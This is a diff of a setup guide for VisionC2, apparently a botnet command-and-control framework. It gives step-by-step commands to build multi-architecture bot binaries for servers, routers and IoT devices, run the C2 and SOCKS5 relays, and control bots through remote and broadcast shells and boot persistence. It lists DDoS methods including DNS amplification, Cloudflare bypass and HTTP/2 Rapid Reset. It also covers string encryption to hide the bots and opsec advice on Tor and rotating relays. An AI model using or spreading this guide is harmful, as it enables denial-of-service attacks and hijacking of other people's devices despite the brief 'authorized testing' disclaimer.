@@ -1,171 +1,289 @@
+# VisionC2 Setup Guide
 
-# VisionC2 Usage Guide
+> Complete installation and configuration guide. The setup script handles config, encryption, patching, and building automatically.
 
-> Setup script handles config, encryption, patching, and building automatically.
-
-> if you can't set this up you're actually retarded
 ---
 
 ## Prerequisites
 
+### System Requirements
+
+| Component | Minimum | Recommended |
+|-----------|---------|-------------|
+| **RAM** | 512MB | 2GB+ |
+| **Storage** | 1GB | 5GB+ |
+| **OS** | Any Linux | Ubuntu 22.04+ / Debian 12+ |
+| **Network** | Port 443 open | + Admin port for remote access |
+
+### Install Dependencies
+
 ```bash
+# Update system and install required packages
 sudo apt update && sudo apt install -y openssl git wget gcc python3 screen netcat
 
-# Go 1.24+
+# Install Go 1.24+
 wget https://go.dev/dl/go1.24.1.linux-amd64.tar.gz
 sudo rm -rf /usr/local/go && sudo tar -C /usr/local -xzf go1.24.1.linux-amd64.tar.gz
 echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc && source ~/.bashrc
 ```
 
-| Requirement | Minimum | Recommended |
-|---|---|---|
-| RAM / Storage | 512MB / 1GB | 2GB+ / 5GB+ |
-| OS | Linux (any) | Ubuntu 22.04+ / Debian 12+ |
-| Network | Port 443 open | + Admin port for split mode |
+**Verify installation:**
+```bash
+go version  # Should show Go 1.24+
+```
 
 ---
 
-## Setup
+## Installation
+
+### Clone and Setup
 
 ```bash
 git clone https://github.com/Syn2Much/VisionC2.git && cd VisionC2
 python3 setup.py   # Select [1] Full Setup
 ```
 
-The wizard prompts for:
-- **C2 address** (IP or domain)
-- **Admin port** (default: 420)
-- **Relay endpoints** (comma-separated `host:port`, optional — press Enter to skip)
-- **SOCKS5 credentials** (default: `vision:vision`)
-- **TLS cert details**
+### Setup Wizard
 
-Output:
+The interactive wizard will prompt for:
 
-```
-bins/              → 14 bot binaries (multi-arch)
-cnc/certificates/  → server.crt + server.key
-server             → CNC binary
-relay_server       → Relay binary
-setup_config.txt   → Config summary
-```
+| Setting | Description | Example |
+|---------|-------------|---------|
+| **C2 Address** | IP or domain for bot connections | `your-server.com` or `192.168.1.100` |
+| **Admin Port** | Port for remote Telnet access | `420` (default) |
+| **Relay Endpoints** | SOCKS5 relay servers (optional) | `relay1.com:9001,relay2.com:9001` |
+| **SOCKS5 Credentials** | Default proxy authentication | `vision:vision` (default) |
+| **TLS Certificate** | SSL certificate details | Country, state, organization, etc. |
 
 ### Setup Options
 
-| Option | Description |
-|---|---|
-| **[1] Full Setup** | Fresh config, new tokens, new TLS certs, builds everything |
-| **[2] C2 URL Update** | Change C2 address only, keeps existing tokens/certs, rebuilds bots + relay |
-| **[3] Relay Endpoints** | Update relay list and SOCKS5 credentials, rebuilds bots + relay |
+| Option | Purpose | Use Case |
+|--------|---------|----------|
+| **[1] Full Setup** | Complete fresh installation | First-time setup, new campaign |
+| **[2] C2 URL Update** | Change C2 address only | Moving to new server |
+| **[3] Relay Endpoints** | Update SOCKS5 relay list | Adding/changing proxy infrastructure |
 
----
+### Generated Files
 
-## Starting the CNC
+After setup completion:
 
-```bash
-./server              # TUI mode (default, recommended)
-./server --split      # Telnet mode on admin port (default: 420)
+```
+VisionC2/
+├── bins/                  # 14 bot binaries (multi-architecture)
+├── cnc/certificates/      # TLS certificates (server.crt, server.key)
+├── server                 # CNC server binary
+├── relay_server          # SOCKS5 relay server binary
+└── setup_config.txt      # Configuration summary
 ```
 
-**Split mode connect:** `nc YOUR_IP 420` → type `spamtec` → login.
-
-**Background:** `screen -S vision ./server` (detach: `Ctrl+A, D`)
-
-**First run** creates root user with random password — save it.
-
 ---
 
-## Deploying the Relay
+## Starting the CNC Server
 
-Copy `relay_server` to a **separate VPS** (not the C2 server):
+### Launch Options
 
 ```bash
-./relay_server                                    # Minimal — auth key baked in
-./relay_server -stats 127.0.0.1:9090              # With stats monitoring
-./relay_server -cp 9001 -sp 1080                  # Custom ports
-./relay_server -cert server.crt -keyfile server.key  # Custom TLS cert
+./server              # Interactive TUI mode (recommended)
+./server --split      # Remote Telnet access mode
 ```
 
-| Port | Default | Purpose |
-|---|---|---|
-| Control (`-cp`) | 9001 | Bots connect here (TLS backconnect) |
-| SOCKS5 (`-sp`) | 1080 | Proxy clients connect here |
+### Remote Access (Split Mode)
 
-> Full relay guide: [PROXY.md](PROXY.md)
+Connect to the Telnet interface:
+```bash
+nc YOUR_SERVER_IP 420
+# Type: spamtec
+# Login with credentials
+```
+
+### Running in Background
+
+```bash
+screen -S vision ./server
+# Detach: Ctrl+A, D
+# Reattach: screen -r vision
+```
+
+**Important:** First run creates a root user with a random password. **Save this password** — it's displayed only once.
 
 ---
 
-## TUI Navigation
+## SOCKS5 Relay Deployment
+
+Deploy the relay server on a **separate VPS** (not your C2 server):
+
+### Basic Deployment
+```bash
+./relay_server                # Minimal setup with defaults
+```
+
+### Advanced Options
+```bash
+./relay_server -stats 127.0.0.1:9090              # Enable statistics dashboard
+./relay_server -cp 9001 -sp 1080                  # Custom control/SOCKS5 ports
+./relay_server -cert server.crt -keyfile server.key  # Custom TLS certificate
+```
+
+### Port Configuration
+
+| Port Type | Default | Purpose |
+|-----------|---------|---------|
+| **Control Port** (`-cp`) | 9001 | Bot backconnect (TLS) |
+| **SOCKS5 Port** (`-sp`) | 1080 | Proxy client connections |
+
+> **Detailed relay setup:** See [PROXY.md](PROXY.md)
+
+---
+
+## TUI Interface Guide
+
+### Navigation Controls
 
 | Key | Action |
-|---|---|
-| `↑/↓` or `k/j` | Navigate |
-| `Enter` | Select |
+|-----|--------|
+| `↑/↓` or `k/j` | Navigate menus |
+| `Enter` | Select item |
 | `q` / `Esc` | Back / Cancel |
-| `r` | Refresh |
+| `r` | Refresh display |
 
 ### Dashboard Views
 
-- **Bot List** — Live bot status. `Enter`=shell, `b`=broadcast shell, `l`=attack, `i`=info, `p`=persist, `r`=reinstall, `k`=kill
-- **Remote Shell** — Interactive shell to one bot. `Ctrl+F`=clear, `Ctrl+P`=persist, `Ctrl+R`=reinstall. Tabs: Shell / Shortcuts / Linux helpers
-- **Broadcast Shell** — Command all bots. `Ctrl+A`=filter arch, `Ctrl+G`=filter RAM, `Ctrl+B`=limit bots. Tabs: Command / Shortcuts
-- **Launch Attack** — Select method, target, port, duration → `l` to launch
-- **Ongoing Attacks** — Progress bars + time remaining. `s`=stop all
-- **Socks Manager** — `s`=quick start (relay), `c`=custom relay, `d`=direct mode, `x`=stop
+**Bot Management:**
+- **Bot List** — Live bot status with actions (`Enter`=shell, `l`=attack, `p`=persist, `k`=kill)
+- **Remote Shell** — Interactive shell to single bot with shortcuts and helpers
+- **Broadcast Shell** — Command all bots with filtering options
+
+**Operations:**
+- **Launch Attack** — Select method, configure target, launch DDoS
+- **Ongoing Attacks** — Monitor active attacks with progress bars
+- **SOCKS Manager** — Configure proxy modes (`s`=relay, `d`=direct, `x`=stop)
 - **Connection Logs** — Bot connect/disconnect history
 
 ---
 
-## Bot Binaries
+## Bot Deployment
 
-14 binaries in `bins/` covering amd64, x86, ARM64, ARMv7, MIPS, MIPSLE, and more (servers, routers, IoT, embedded).
+### Multi-Architecture Support
 
-| Command | Description |
-|---|---|
-| `!info` | System info |
-| `!persist` | Boot persistence |
-| `!reinstall` | Force re-download |
-| `!kill` | Remove persistence + terminate bot |
+14 compiled binaries in `bins/` directory covering:
+- **x86/x64:** Intel/AMD servers
+- **ARM:** Raspberry Pi, mobile, embedded
+- **MIPS:** Routers, IoT devices, network appliances
+- **PowerPC/RISC-V:** Specialized hardware
+
+### Bot Commands
+
+| Command | Purpose |
+|---------|---------|
+| `!info` | Display system information |
+| `!persist` | Install boot persistence |
+| `!reinstall` | Force bot re-download |
+| `!kill` | Remove persistence and terminate |
 
 ---
 
 ## Attack Methods
 
-**L4:** `!udpflood` `!tcpflood` `!syn` `!ack` `!gre` `!dns`
-**L7:** `!http` `!https` `!cfbypass` `!rapidreset`
+### Layer 4 (Network)
+- `!udpflood` — UDP volume flooding
+- `!tcpflood` — TCP connection exhaustion
+- `!syn` — SYN flood (raw packets)
+- `!ack` — ACK flood (raw packets)
+- `!gre` — GRE protocol flooding
+- `!dns` — DNS amplification
+
+### Layer 7 (Application)
+- `!http` — HTTP request flooding
+- `!https` — HTTPS/TLS exhaustion
+- `!cfbypass` — Cloudflare bypass
+- `!rapidreset` — HTTP/2 CVE-2023-44487 exploit
 
 ---
 
-## String Encryption
+## Configuration Management
 
-All sensitive strings are AES-128-CTR encrypted in `bot/config.go`. Per-build random key — two builds produce completely different encrypted payloads.
+### String Encryption
+
+All sensitive strings are encrypted in `bot/config.go` with AES-128-CTR using per-build random keys.
 
 ```bash
-go run tools/crypto.go encrypt "string"           # Encrypt
-go run tools/crypto.go encrypt-slice "a" "b" "c"   # Encrypt slice
-go run tools/crypto.go decrypt <hex>                # Decrypt
-go run tools/crypto.go generate                     # Regenerate all blobs
-go run tools/crypto.go verify                       # Verify config.go
-go run tools/crypto.go resetconfig                  # Reset to zero-key state
+# Encrypt single string
+go run tools/crypto.go encrypt "sensitive_string"
+
+# Encrypt string array
+go run tools/crypto.go encrypt-slice "string1" "string2" "string3"
+
+# Decrypt encrypted blob
+go run tools/crypto.go decrypt <hex_blob>
+
+# Regenerate all encrypted config
+go run tools/crypto.go generate
+
+# Verify config integrity
+go run tools/crypto.go verify
+
+# Reset to development state
+go run tools/crypto.go resetconfig
 ```
 
 ---
 
-## Quick Reference
+## Troubleshooting
+
+### Common Issues
+
+| Problem | Solution |
+|---------|----------|
+| **Port 443 denied** | `sudo setcap 'cap_net_bind_service=+ep' ./server` |
+| **Bots not connecting** | Check firewall: `ufw allow 443/tcp` |
+| **Connection issues** | Test TLS: `openssl s_client -connect HOST:443` |
+| **Performance problems** | Run: `sudo bash tools/fix_botkill.sh` |
+
+### Maintenance Commands
 
 | Task | Command |
-|---|---|
-| Rebuild bots only | `cd tools && ./build.sh` |
-| Remove persistence | `sudo bash tools/cleanup.sh` |
-| Regen TLS certs | `python3 setup.py` → [1], or `openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -days 365 -nodes` |
-| Port 443 denied | `sudo setcap 'cap_net_bind_service=+ep' ./server` |
-| Bots not connecting | Check firewall (`ufw allow 443/tcp`), verify C2 in `setup_config.txt`, test TLS (`openssl s_client -connect HOST:443`) |
-| Server tuning | `sudo bash tools/fix_botkill.sh` (fd limits, TCP buffers) |
-| Update relay endpoints | `python3 setup.py` → [3] |
+|------|---------|
+| **Rebuild bots only** | `cd tools && ./build.sh` |
+| **Remove persistence** | `sudo bash tools/cleanup.sh` |
+| **Regenerate TLS certs** | `python3 setup.py` → [1] |
+| **Update relay endpoints** | `python3 setup.py` → [3] |
+
+### Manual Certificate Generation
+
+```bash
+openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -days 365 -nodes
+```
 
 ---
 
-**Docs:** [Architecture](Docs/ARCHITECTURE.md) · [Commands](Docs/COMMANDS.md) · [Proxy/Relay](Docs/PROXY.md) · [Changelog](Docs/CHANGELOG.md)
+## Security Notes
 
-**Authorized security research only.** Obtain written permission before testing any systems.
+### Operational Security
+- Use separate VPS for relay servers
+- Rotate relay infrastructure regularly  
+- Monitor connection logs for anomalies
+- Use Tor for C2 panel access when possible
 
-*VisionC2*
+### Legal Compliance
+- **Authorized testing only** — Obtain written permission before testing any systems
+- Document all testing activities
+- Follow responsible disclosure for discovered vulnerabilities
+- Ensure compliance with local cybersecurity laws
+
+---
+
+## Additional Resources
+
+### Documentation
+- **[ARCHITECTURE.md](Docs/ARCHITECTURE.md)** — Technical architecture details
+- **[COMMANDS.md](Docs/COMMANDS.md)** — Complete command reference
+- **[PROXY.md](Docs/PROXY.md)** — SOCKS5 relay deployment guide
+- **[CHANGELOG.md](Docs/CHANGELOG.md)** — Version history and updates
+
+### Support
+- Check configuration in `setup_config.txt`
+- Review logs for error messages
+- Verify network connectivity and firewall rules
+- Test with minimal setup before full deployment
+
+---
